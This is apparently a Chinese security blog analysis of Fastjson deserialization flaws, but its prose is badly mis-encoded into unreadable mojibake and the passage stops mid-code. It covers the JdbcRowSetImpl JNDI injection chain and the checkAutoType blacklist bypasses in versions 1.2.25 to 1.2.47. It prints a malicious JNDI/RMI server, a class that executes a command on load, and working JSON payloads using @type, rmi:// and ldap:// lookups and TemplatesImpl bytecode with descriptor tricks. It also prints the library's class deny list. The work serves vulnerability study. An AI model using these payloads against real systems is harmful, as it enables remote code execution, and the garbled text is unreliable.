javax.naming.InitialContext#lookup() å‚æ•°å¯æ§å¯¼è‡´çš„ JNDI æ³¨å…¥ã€‚\nJdbcRowSetImplè°ƒç”¨å‡½æ•°æ ˆ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 exec:348, Runtime (java.lang) :19, badClassName (com.reus09) newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect) newInstance:62, NativeConstructorAccessorImpl (sun.reflect) newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect) newInstance:423, Constructor (java.lang.reflect) newInstance:442, Class (java.lang) getObjectFactoryFromReference:174, NamingManager (javax.naming.spi) getObjectInstance:330, NamingManager (javax.naming.spi) decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry) lookup:138, RegistryContext (com.sun.jndi.rmi.registry) lookup:205, GenericURLContext (com.sun.jndi.toolkit.url) lookup:417, InitialContext (javax.naming) connect:624, JdbcRowSetImpl (com.sun.rowset) setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseRest:922, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) parse:137, JSON (com.alibaba.fastjson) parse:128, JSON (com.alibaba.fastjson) main:123, FastJsonTest (com.reus09) å…ˆçœ‹ä¸€ä¸‹ setAutoCommit() æ–¹æ³•ï¼Œåœ¨ conn ä¸ºç©ºæ—¶ï¼Œå°†ä¼šè°ƒç”¨ connect() æ–¹æ³•ã€‚\nç„¶ååœ¨connectæ–¹æ³•é‡Œé¢è°ƒç”¨äº† javax.naming.InitialContext#lookup() æ–¹æ³•ï¼Œå‚æ•°ä»æˆå‘˜å˜é‡ dataSource ä¸­è·å–ã€‚\né€šè¿‡å‡½æ•°æ ˆçš„å˜åŒ–ï¼Œå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°ï¼Œåœ¨FastJsonè§£æå‡½æ•°parseå‡½æ•°ä½œç”¨çš„æ—¶å€™ï¼Œé€šè¿‡åå°„ç»™ç±»çš„å…ƒç´ èµ‹å€¼çš„æ—¶å€™å¼•èµ·çš„å‘½ä»¤æ‰§è¡Œã€‚åœ¨FieldDeserialize#setValueæ–¹æ³•ï¼Œç„¶åæ‰§è¡ŒsetAutoCommit()æ–¹æ³•ï¼Œè¿›è€Œå®ç°ååºåˆ—åŒ–ã€‚ ç¼–å†™ä¸€ä¸ªJNDIæœåŠ¡\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package com.reus09; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.NamingException; import javax.naming.Reference; import java.rmi.AlreadyBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; /** * @ClassName JDNIServer * @Description TODO * @Author reus09 * @Date 2022/10/12 18:09 * @Version 1.0 **/ public class JDNIServer { public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException { Registry registry = LocateRegistry.createRegistry(1099); Reference reference = new Reference(\"com.reus09.badClassName\", \"com.reus09.badClassName\",\"http://127.0.0.1:8000/\"); ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); registry.bind(\"Exploit\",referenceWrapper); } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package com.reus09; import javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.io.IOException; import java.util.Hashtable; public class badClassName implements ObjectFactory { public badClassName() throws IOException { Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\"); } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable\u003c?, ?\u003e environment) throws Exception { return null; } } Payloadéƒ¨åˆ†\nJSONæ ¼å¼\n1 2 3 4 5 { \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\", \"autoCommit\":true } ä»£ç \n1 2 3 4 5 6 7 8 // è§£å†³javaç‰ˆæœ¬è¿‡é«˜çš„é—®é¢˜ï¼Œé»˜è®¤ä»¥ä¸‹çš„å…ƒç´ éƒ½ä¸ºfalse System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\",\"true\"); System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\",\"true\"); System.setProperty(\"com.sun.jndi.cosnaming.object.trustURLCodebase\",\"true\"); System.out.println(\"JdbcRowSetImpl é“¾çš„åˆ©ç”¨\"); String payload2 = \"{\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"rmi://127.0.0.1:1099/Exploit\\\", \\\"autoCommit\\\":true}\"; JSON.parse(payload2); AutoTypeä¸checkAutoType Fastjsonæä¾›äº†autotypeåŠŸèƒ½,å…è®¸ç”¨æˆ·åœ¨ååºåˆ—åŒ–æ•°æ®ä¸­é€šè¿‡â€œ@typeâ€æŒ‡å®šååºåˆ—åŒ–çš„Classç±»å‹ã€‚\nç®€å•çš„æ¥è¯´å°±æ˜¯ï¼šå½“ä¸€ä¸ªç±»ä¸­åŒ…å«äº†ä¸€ä¸ªæ¥å£ï¼ˆæˆ–æŠ½è±¡ç±»ï¼‰çš„æ—¶å€™ï¼Œåœ¨æ­£å¸¸ååºåˆ—åŒ–ä¸­ï¼Œä¼šå°†å­ç±»å‹æŠ¹å»ï¼Œåªä¿ç•™æ¥å£ï¼ˆæŠ½è±¡ç±»ï¼‰çš„ç±»å‹ï¼Œä½¿å¾—ååºåˆ—åŒ–æ—¶æ— æ³•æ‹¿åˆ°åŸå§‹ç±»å‹ã€‚FastJsoné€šè¿‡ä½¿ç”¨autotypeæ¥å¯¹æŒ‡å®šçš„@typeå®ç°çš„æ¥å£åŒæ ·è¿›è¡Œæ­£å¸¸ååºåˆ—åŒ–ã€‚\nå…·ä½“çš„è¯ï¼Œçœ‹pandaå¸ˆå‚…å¯¹AutoTypeèµ·åˆ°çš„ä½œç”¨è¿›è¡Œäº†ç®€å•çš„ä»‹ç»ã€‚\ncheckAutoTypeæ˜¯ FastJson åœ¨ 1.2.25 ä»¥åŠä¹‹åçš„ç‰ˆæœ¬ä¸­ï¼Œä¸ºäº†é˜²æ­¢ autoType è¿™ä¸€æœºåˆ¶å¸¦æ¥çš„ å®‰å…¨éšæ‚£ï¼Œå¢åŠ çš„æ£€æµ‹é˜²å¾¡æœºåˆ¶ï¼Œè¿™æ˜¯ä¸€ä¸ªå¯¹äº @type å±æ€§è¿›è¡Œç™½åå•+é»‘åå•çš„é™åˆ¶æœºåˆ¶ã€‚\næ—©æœŸç‰ˆæœ¬çš„checkAutoTypeå­˜åœ¨ä¸€äº›æ¯”è¾ƒä½çº§çš„ç»•è¿‡æ–¹æ³•ï¼Œå¦‚åŠ ä¸ŠLå¼€å¤´;ç»“å°¾ã€åŒå†™LLç»•è¿‡ ç­‰ï¼Œç›´åˆ°1.2.48ç‰ˆæœ¬åï¼ŒcheckAutoType å˜å¾—æˆç†Ÿï¼Œé»‘åå•ä¹Ÿé€æ¸å®Œå–„ã€‚\nå…¶å…·ä½“é€»è¾‘ï¼Œå¯ä»¥ç”¨ã€ŠHow i use json deserializationã€‹è®®é¢˜çš„ä¸€å¼ å›¾ç‰‡æ¦‚æ‹¬:\ncheckAutoTypeé¦–å…ˆä¼šå¯¹ä¼ å…¥çš„typeNameè¿›è¡Œ3é¡¹æ£€æµ‹:\næ˜¯å¦æ˜¯ç™½åå•ä¸­çš„ç±» æ˜¯å¦åœ¨ååºåˆ—åŒ–cacheä¸­(åœ¨mappingsåˆ—è¡¨) ç±»æœ‰JSONTypeæ³¨è§£(å¦‚:fastjson.annotation.JSONType) å¦‚æœæ»¡è¶³ä»¥ä¸Šæ¡ä»¶ï¼Œé‚£ä¹ˆä¼šç›´æ¥returnå‡ºå»ç»§ç»­æ‰§è¡Œååºåˆ—åŒ–æµç¨‹å¹¶ä¸”å°†æœªè½½å…¥cacheçš„ç±»è½½ å…¥cache\nå¦‚æœæ²¡æœ‰æ»¡è¶³å…¶ä¸­çš„ä¸€ä¸ªæ¡ä»¶ï¼Œé‚£ä¹ˆä¼šè¿›å…¥å¦ä¸€ä¸ªåˆ¤æ–­:\nä¼ å…¥çš„typeNameæ˜¯å¦åœ¨é»‘åå•ä¸­ æ˜¯å¦ç»§æ‰¿è‡ªRowSetã€DataSourceã€ClassLoaderç­‰ç±» å¦‚æœæ»¡è¶³ä¸Šè¿°æ¡ä»¶ä¹‹ä¸€ï¼Œé‚£ä¹ˆç›´æ¥æŠ›å‡ºé”™è¯¯ å¦‚æœéƒ½ä¸æ»¡è¶³ï¼Œé‚£ä¹ˆä¼šè¿›è¡Œå¦‚ä¸‹åˆ¤æ–­:\nexpectClassä¸ä¸ºNULLã€Objectã€Serializableã€Closeableç­‰ç±»å‹ ä¼ å…¥çš„typeNameç±»ç»§æ‰¿äºexpctClass å¦‚æœæ»¡è¶³ä»¥ä¸Šæ¡ä»¶ï¼Œé‚£ä¹ˆä¼šç›´æ¥returnå‡ºå»ç»§ç»­æ‰§è¡Œååºåˆ—åŒ–æµç¨‹å¹¶ä¸”å°†æœªè½½å…¥cacheçš„ç±»è½½ å…¥cache\nå¦‚æœä¸æ»¡è¶³ï¼Œé‚£ä¹ˆä¼šç»è¿‡autoTypeSupportçš„åˆ¤æ–­ï¼ŒautoTypeSupportä¸»è¦ç”¨æ¥æ‰“å¼€autotypeåŠŸèƒ½ï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯falseï¼ŒæŠ›å‡ºé”™è¯¯ï¼Œå¦‚æœè®¾ç½®çš„æ˜¯Trueé‚£ä¹ˆä¼šreturnå‡ºå»ç»§ç»­æ‰§è¡Œååºåˆ—åŒ–æµ ç¨‹å¹¶ä¸”å°†æœªè½½å…¥cacheçš„ç±»è½½å…¥cacheã€‚\nå†å²æ¼æ´åˆ†æ fastjson-1.2.25 åœ¨ç‰ˆæœ¬ 1.2.25 ä¸­ï¼Œå®˜æ–¹å¯¹ä¹‹å‰çš„ååºåˆ—åŒ–æ¼æ´è¿›è¡Œäº†ä¿®å¤ï¼Œå¼•å…¥äº† checkAutoType å®‰å…¨æœºåˆ¶ï¼Œé»˜è®¤æƒ…å†µä¸‹ autoTypeSupport å…³é—­ï¼Œä¸èƒ½ç›´æ¥ååºåˆ—åŒ–ä»»æ„ç±»ï¼Œè€Œæ‰“å¼€ AutoType ä¹‹åï¼Œæ˜¯åŸºäºå†…ç½®é»‘åå•æ¥å®ç°å®‰å…¨çš„ï¼Œfastjson ä¹Ÿæä¾›äº†æ·»åŠ é»‘åå•çš„æ¥å£ã€‚\nå½±å“ç‰ˆæœ¬ï¼š1.2.25 \u003c= fastjson \u003c= 1.2.41 æè¿°ï¼šä½œè€…é€šè¿‡ä¸ºå±é™©åŠŸèƒ½æ·»åŠ å¼€å…³ï¼Œå¹¶æä¾›é»‘ç™½åå•ä¸¤ç§æ–¹å¼è¿›è¡Œå®‰å…¨é˜²æŠ¤ï¼Œå…¶å®å·²ç»æ˜¯ç›¸å½“å®Œæ•´çš„é˜²æŠ¤æ€è·¯ï¼Œè€Œä¸”ä½œè€…å·²ç»æ„è¯†åˆ°é»‘åå•ç±»å°†ä¼šæ— ç©·æ— å°½ï¼Œä»…ä»…é€šè¿‡ç»´æŠ¤åˆ—è¡¨æ¥é˜²æ­¢ååºåˆ—åŒ–æ¼æ´å¹¶éæœ€å¥½çš„åŠæ³•ã€‚è€Œä¸”é ç”¨æˆ·è‡ªå·±æ¥å…³æ³¨å®‰å…¨ä¿¡æ¯å»ç»´æŠ¤ä¹Ÿä¸ç°å®ã€‚\nå®‰å…¨æ›´æ–°ä¸»è¦é›†ä¸­åœ¨ com.alibaba.fastjson.parser.ParserConfigï¼Œé¦–å…ˆæŸ¥çœ‹ç±»ä¸Šå‡ºç°äº†å‡ ä¸ªæˆå‘˜å˜é‡ï¼šå¸ƒå°”å‹çš„ autoTypeSupportï¼Œç”¨æ¥æ ‡è¯†æ˜¯å¦å¼€å¯ä»»æ„ç±»å‹çš„ååºåˆ—åŒ–ï¼Œå¹¶ä¸”é»˜è®¤å…³é—­ï¼›å­—ç¬¦ä¸²æ•°ç»„ denyList ï¼Œæ˜¯ååºåˆ—åŒ–ç±»çš„é»‘åå•ï¼›acceptList æ˜¯ååºåˆ—åŒ–ç™½åå•ã€‚\nå…¶ä¸­é»‘åå• denyList åŒ…æ‹¬ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 bsh com.mchange com.sun. java.lang.Thread java.net.Socket java.rmi javax.xml org.apache.bcel org.apache.commons.beanutils org.apache.commons.collections.Transformer org.apache.commons.collections.functors org.apache.commons.collections4.comparators org.apache.commons.fileupload org.apache.myfaces.context.servlet org.apache.tomcat org.apache.wicket.util org.codehaus.groovy.runtime org.hibernate org.jboss org.mozilla.javascript org.python.core org.springframework æ·»åŠ ååºåˆ—åŒ–ç™½åå•æœ‰3ç§æ–¹æ³•ï¼š\nä½¿ç”¨ä»£ç è¿›è¡Œæ·»åŠ ï¼šParserConfig.getGlobalInstance().addAccept(â€œorg.reus09.fastjson.,org.javaweb.â€) åŠ ä¸ŠJVMå¯åŠ¨å‚æ•°ï¼š-Dfastjson.parser.autoTypeAccept=org.reus09.fastjson. åœ¨fastjson.propertiesä¸­æ·»åŠ ï¼šfastjson.parser.autoTypeAccept=org.reus09.fastjson. ç„¶åæˆ‘ä»¬åˆ†æä¸€ä¸‹1.2.25ç‰ˆæœ¬ä¸‹çš„checkæœºåˆ¶\né¦–å…ˆå¼€å¯autoTypeSupport,å…ˆæ ¹æ®ç™½åå•è¿›è¡Œåˆ¤åˆ«ï¼Œå†é€šè¿‡é»‘åå•è¿›è¡Œåˆ¤åˆ«ã€‚å¦‚æœåœ¨ï¼Œå°±ä½¿ç”¨ TypeUtils.loadClass åŠ è½½ï¼Œç„¶åä½¿ç”¨é»‘åå•åˆ¤æ–­ç±»åçš„å¼€å¤´ï¼Œå¦‚æœåŒ¹é…å°±æŠ›å‡ºå¼‚å¸¸ã€‚\nå¦‚æœä¸Šé¢æ²¡æŸ¥è¯¢åˆ°ï¼Œé€šè¿‡TypeUtils.getClassFromMapping(typeName)ç¼“å­˜åˆ¤æ–­\nç¼“å­˜é‡Œé¢çš„ç§ç±»å¦‚ä¸‹ï¼š\nç¼“å­˜ä¹Ÿæ²¡æœ‰ï¼Œåœ¨æ²¡æœ‰å¼€å¯autoTypeSupportçš„æ—¶å€™ï¼Œå…ˆè¿›å…¥é»‘åå•è¿›è¡Œåˆ¤æ–­ï¼Œç„¶ååœ¨ç™½åå•è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœå­˜åœ¨ç™½åå•ï¼ŒåŒæ ·è¿›è¡ŒloadlClassåŠ è½½ã€‚\næœ€åï¼Œå¦‚æœå®ƒæ˜¯ä¸ªæœŸæœ›ç±»ï¼Œå¹¶ä¸”åœ¨é»‘ç™½åå•éƒ½æ²¡æœ‰æ‰¾åˆ°ï¼ŒåŒæ ·è°ƒç”¨loadClassã€‚\næˆ‘ä»¬é€šè¿‡åˆ†æloadClassæ–¹æ³•çš„é€»è¾‘ï¼Œè¿™ä¸ªç±»åœ¨åŠ è½½ç›®æ ‡ç±»ä¹‹å‰ä¸ºäº†å…¼å®¹å¸¦æœ‰æè¿°ç¬¦çš„ç±»åï¼Œä½¿ç”¨äº†é€’å½’è°ƒç”¨æ¥å¤„ç†æè¿°ç¬¦ä¸­çš„ [ã€Lã€; å­—ç¬¦ã€‚\nåœ¨è¿™ä¸ªä½ç½®å‡ºç°äº†é€»è¾‘æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨å¸¦æœ‰æè¿°ç¬¦çš„ç±»ç»•è¿‡é»‘åå•çš„é™åˆ¶ï¼Œè€Œåœ¨ç±»åŠ è½½è¿‡ç¨‹ä¸­ï¼Œæè¿°ç¬¦è¿˜ä¼šè¢«å¤„ç†æ‰ã€‚å› æ­¤ï¼Œæ¼æ´åˆ©ç”¨çš„æ€è·¯å°±å‡ºæ¥äº†ï¼šéœ€è¦å¼€å¯ autoTypeï¼Œä½¿ç”¨ä»¥ä¸Šå­—ç¬¦æ¥è¿›è¡Œé»‘åå•çš„ç»•è¿‡ã€‚\npayload:\n1 2 3 4 5 6 7 { \"@type\": \"Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\", \"_bytecodes\": [\"yv66vgAAADQA...CJAAk=\"], \"_name\": \"reus09\", \"_tfactory\": {}, \"_outputProperties\": {}, } fastjson-1.2.42 åœ¨ç‰ˆæœ¬ 1.2.42 ä¸­ï¼Œfastjson ç»§ç»­å»¶ç»­äº†é»‘ç™½åå•çš„æ£€æµ‹æ¨¡å¼ï¼Œä½†æ˜¯å°†é»‘åå•ç±»ä»ç™½åå•ä¿®æ”¹ä¸ºä½¿ç”¨ HASH çš„æ–¹å¼è¿›è¡Œå¯¹æ¯”ï¼Œè¿™æ˜¯ä¸ºäº†é˜²æ­¢å®‰å…¨ç ”ç©¶äººå‘˜æ ¹æ®é»‘åå•ä¸­çš„ç±»è¿›è¡Œåå‘ç ”ç©¶ï¼Œç”¨æ¥å¯¹æœªæ›´æ–°çš„å†å²ç‰ˆæœ¬è¿›è¡Œæ”»å‡»ã€‚åŒæ—¶ï¼Œä½œè€…å¯¹ä¹‹å‰ç‰ˆæœ¬ä¸€ç›´å­˜åœ¨çš„ä½¿ç”¨ç±»æè¿°ç¬¦ç»•è¿‡é»‘åå•æ ¡éªŒçš„é—®é¢˜å°è¯•è¿›è¡Œäº†ä¿®å¤ã€‚\nå½±å“ç‰ˆæœ¬ï¼š1.2.25 \u003c= fastjson \u003c= 1.2.42 æè¿°ï¼šé€šè¿‡å˜é‡å¸¸ç”¨çš„jarã€ç±»ã€å­—ç¬¦ä¸²ç¢°æ’hashå¾—åˆ°é»‘åå•\nè¿˜æ˜¯å…³æ³¨ com.alibaba.fastjson.parser.ParserConfig è¿™ä¸ªç±»ï¼Œä½œè€…å°†åŸæœ¬çš„æ˜æ–‡é»‘åå•è½¬ä¸ºä½¿ç”¨äº† Hash é»‘åå•ï¼Œé˜²æ­¢å®‰å…¨äººå‘˜å¯¹å…¶ç ”ç©¶ã€‚\nåŠ å¯†æ–¹å¼åœ¨com.alibaba.fastjson.util.TypeUtils#fnv1a_64æ˜¯æœ‰çš„\nå¹¶ä¸”åœ¨ checkAutoType ä¸­åŠ å…¥åˆ¤æ–­ï¼Œå¦‚æœç±»çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ L ç»“å°¾æ˜¯ ;ï¼Œåˆ™ä½¿ç”¨ substring è¿›è¡Œäº†å»é™¤ã€‚è¿˜æ˜¯ç”¨hashå†™çš„ã€‚\nä½†æ˜¯è¿™ç§åˆ¤æ–­å®Œå…¨æ˜¯å¾’åŠ³çš„ï¼Œå› ä¸ºåœ¨æœ€åloadClasså¤„ç†æ—¶æ˜¯é€’å½’å¤„ç†ï¼Œå› æ­¤åªè¦å¯¹æè¿°ç¬¦è¿›è¡ŒåŒå†™å³å¯ç»•è¿‡ï¼š\npayload:\n1 2 3 4 5 6 7 { \"@type\": \"LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;\", \"_bytecodes\": [\"yv66vgAAADQA...CJAAk=\"], \"_name\": \"reus09\", \"_tfactory\": {}, \"_outputProperties\": {}, } fastjson-1.2.43 è¿™ä¸ªç‰ˆæœ¬ä¸»è¦æ˜¯ä¿®å¤ä¸Šä¸€ä¸ªç‰ˆæœ¬ä¸­åŒå†™ç»•è¿‡çš„é—®é¢˜ã€‚\nå½±å“ç‰ˆæœ¬ï¼š1.2.25 \u003c= fastjson \u003c= 1.2.43 æè¿°ï¼šä¸Šæœ‰æ”¿ç­–ï¼Œä¸‹æœ‰å¯¹ç­–ã€‚åœ¨ Lã€; è¢«è¿›è¡Œäº†é™åˆ¶åï¼Œå®‰å…¨ç ”ç©¶äººå‘˜å°†ç›®å…‰è½¬å‘äº† [ã€‚\nå¯ä»¥çœ‹åˆ°ç”¨æ¥æ£€æŸ¥çš„ checkAutoType ä»£ç æ·»åŠ äº†åˆ¤æ–­ï¼Œå¦‚æœç±»åè¿ç»­å‡ºç°äº†ä¸¤ä¸ª L å°†ä¼šæŠ›å‡ºå¼‚å¸¸\nè¿™æ ·ä½¿ç”¨ Lã€; ç»•è¿‡é»‘åå•çš„æ€è·¯å°±è¢«é˜»æŒ¡äº†ï¼Œä½†æ˜¯åœ¨ loadClass çš„è¿‡ç¨‹ä¸­ï¼Œè¿˜é’ˆå¯¹ [ ä¹Ÿè¿›è¡Œäº†å¤„ç†å’Œé€’å½’.\npayload:\n1 2 3 4 5 6 7 { \"@type\": \"[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"[, {\"_bytecodes\": [\"yv66vgAAADQA...CJAAk=\"], \"_name\": \"reus09\", \"_tfactory\": {}, \"_outputProperties\": {}, } fastjson-1.2.44 è¿™ä¸ªç‰ˆæœ¬ä¸»è¦æ˜¯ä¿®å¤ä¸Šä¸€ä¸ªç‰ˆæœ¬ä¸­ä½¿ç”¨ [ ç»•è¿‡é»‘åå•é˜²æŠ¤çš„é—®é¢˜ã€‚\nå½±å“ç‰ˆæœ¬ï¼š1.2.25 \u003c= fastjson \u003c= 1.2.44 æè¿°ï¼šåœ¨æ­¤ç‰ˆæœ¬å°† [ ä¹Ÿè¿›è¡Œä¿®å¤äº†ä¹‹åï¼Œç”±å­—ç¬¦ä¸²å¤„ç†å¯¼è‡´çš„é»‘åå•ç»•è¿‡ä¹Ÿå°±å‘Šä¸€æ®µè½äº†ã€‚\nåœ¨ checkAutoType ä¸­æ·»åŠ äº†æ–°çš„åˆ¤æ–­ï¼Œå¦‚æœç±»åä»¥ [ å¼€å§‹åˆ™ç›´æ¥æŠ›å‡ºå¼‚å¸¸ã€‚\nå¯ä»¥ä½¿ç”¨åƒfastjson-1.2.45çš„payload byPass\nfastjson-1.2.45 åœ¨æ­¤ç‰ˆæœ¬çˆ†å‡ºäº†ä¸€ä¸ªé»‘åå•ç»•è¿‡ï¼Œå®é™…ä¸Šï¼Œé»‘åå•æ˜¯æ— ç©·æ— å°½çš„ï¼Œéšç€ fastjson çš„ç‰ˆæœ¬æ›´æ–°ï¼Œä¸€å®šä¼šæœ‰æ›´å¤šçš„é»‘åå•çˆ†å‡ºæ¥ï¼Œå› ä¸ºéš”å£ jackson éƒ½æ˜¯æ˜æ–‡é»‘åå•çš„ï¼Œåªè¦éš”å£ä¸€æ›´æ–°ï¼Œå¤§å®¶éƒ½çœ‹åˆ°äº†ï¼Œå°±ä¼šæ‹¿æ¥çœ‹ fastjsonã€‚\nå½±å“ç‰ˆæœ¬ï¼š1.2.25 \u003c= fastjson \u003c= 1.2.45 æè¿°ï¼šé»‘åå•åˆ—è¡¨éœ€è¦ä¸æ–­è¡¥å……ã€‚\npayloadå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 { \"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\", \"properties\":{ \"data_source\":\"ldap://127.0.0.1:23457/Command8\" } } éœ€è¦pom\n1 2 3 4 5 org.apache.ibatis ibatis-core 3.0 fastjson-1.2.47 åœ¨ fastjson ä¸æ–­è¿­ä»£åˆ° 1.2.47 æ—¶ï¼Œçˆ†å‡ºäº†æœ€ä¸ºä¸¥é‡çš„æ¼æ´ï¼Œå¯ä»¥åœ¨ä¸å¼€å¯ AutoTypeSupport çš„æƒ…å†µä¸‹è¿›è¡Œååºåˆ—åŒ–çš„åˆ©ç”¨ã€‚\nå½±å“ç‰ˆæœ¬ï¼š1.2.25 \u003c= fastjson \u003c= 1.2.32 æœªå¼€å¯ AutoTypeSupport å½±å“ç‰ˆæœ¬ï¼š1.2.33 \u003c= fastjson \u003c= 1.2.47ä¸è®ºæ˜¯å¦å¼€å¯AutoTypeSupport æè¿°ï¼šä½œè€…åˆ é™¤äº†ä¸€ä¸ª fastjson çš„æµ‹è¯•æ–‡ä»¶ï¼šhttps://github.com/alibaba/fastjson/commit/be41b36a8d748067ba4debf12bf236388e500c66 ï¼Œé‡Œé¢åŒ…å«äº†è¿™æ¬¡é€šæ€æ¼æ´çš„ payloadã€‚\nåˆ†æ è¿™æ¬¡çš„ç»•è¿‡é—®é¢˜è¿˜æ˜¯å‡ºç°åœ¨ checkAutoType() æ–¹æ³•ä¸­ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 public Class\u003c?\u003e checkAutoType(String typeName, Class\u003c?\u003e expectClass, int features) { // ç±»åéç©ºåˆ¤æ–­ if (typeName == null) { return null; } // ç±»åé•¿åº¦åˆ¤æ–­ï¼Œä¸å¤§äº128ä¸å°äº3 if (typeName.length() \u003e= 128 || typeName.length() \u003c 3) { throw new JSONException(\"autoType is not support. \" + typeName); } String className = typeName.replace('$', '.'); Class\u003c?\u003e clazz = null; final long BASIC = 0xcbf29ce484222325L; //; final long PRIME = 0x100000001b3L; //L final long h1 = (BASIC ^ className.charAt(0)) * PRIME; // ç±»åä»¥ [ å¼€å¤´æŠ›å‡ºå¼‚å¸¸ if (h1 == 0xaf64164c86024f1aL) { // [ throw new JSONException(\"autoType is not support. \" + typeName); } // ç±»åä»¥ L å¼€å¤´ä»¥ ; ç»“å°¾æŠ›å‡ºå¼‚å¸¸ if ((h1 ^ className.charAt(className.length() - 1)) * PRIME == 0x9198507b5af98f0L) { throw new JSONException(\"autoType is not support. \" + typeName); } final long h3 = (((((BASIC ^ className.charAt(0)) * PRIME) ^ className.charAt(1)) * PRIME) ^ className.charAt(2)) * PRIME; // autoTypeSupport ä¸º true æ—¶ï¼Œå…ˆå¯¹æ¯” acceptHashCodes åŠ è½½ç™½åå•é¡¹ if (autoTypeSupport || expectClass != null) { long hash = h3; for (int i = 3; i \u003c className.length(); ++i) { hash ^= className.charAt(i); hash *= PRIME; if (Arrays.binarySearch(acceptHashCodes, hash) \u003e= 0) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false); if (clazz != null) { return clazz; } } // åœ¨å¯¹æ¯” denyHashCodes è¿›è¡Œé»‘åå•åŒ¹é… // å¦‚æœé»‘åå•æœ‰åŒ¹é…å¹¶ä¸” TypeUtils.mappings é‡Œæ²¡æœ‰ç¼“å­˜è¿™ä¸ªç±» // åˆ™æŠ›å‡ºå¼‚å¸¸ if (Arrays.binarySearch(denyHashCodes, hash) \u003e= 0 \u0026\u0026 TypeUtils.getClassFromMapping(typeName) == null) { throw new JSONException(\"autoType is not support. \" + typeName); } } } // å°è¯•åœ¨ TypeUtils.mappings ä¸­æŸ¥æ‰¾ç¼“å­˜çš„ class if (clazz == null) { clazz = TypeUtils.getClassFromMapping(typeName); } // å°è¯•åœ¨ deserializers ä¸­æŸ¥æ‰¾è¿™ä¸ªç±» if (clazz == null) { clazz = deserializers.findClass(typeName); } // å¦‚æœæ‰¾åˆ°äº†å¯¹åº”çš„ classï¼Œåˆ™ä¼šè¿›è¡Œ return if (clazz != null) { if (expectClass != null \u0026\u0026 clazz != java.util.HashMap.class \u0026\u0026 !expectClass.isAssignableFrom(clazz)) { throw new JSONException(\"type not match. \" + typeName + \" -\u003e \" + expectClass.getName()); } return clazz; } // å¦‚æœæ²¡æœ‰å¼€å¯ AutoTypeSupport ï¼Œåˆ™å…ˆåŒ¹é…é»‘åå•ï¼Œåœ¨åŒ¹é…ç™½åå•ï¼Œä¸ä¹‹å‰é€»è¾‘ä¸€è‡´ if (!autoTypeSupport) { long hash = h3; for (int i = 3; i \u003c className.length(); ++i) { char c = className.charAt(i); hash ^= c; hash *= PRIME; if (Arrays.binarySearch(denyHashCodes, hash) \u003e= 0) { throw new JSONException(\"autoType is not support. \" + typeName); } if (Arrays.binarySearch(acceptHashCodes, hash) \u003e= 0) { if (clazz == null) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false); } if (expectClass != null \u0026\u0026 expectClass.isAssignableFrom(clazz)) { throw new JSONException(\"type not match. \" + typeName + \" -\u003e \" + expectClass.getName()); } return clazz; } } } // å¦‚æœ class è¿˜ä¸ºç©ºï¼Œåˆ™ä½¿ç”¨ TypeUtils.loadClass å°è¯•åŠ è½½è¿™ä¸ªç±» if (clazz == null) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false); } if 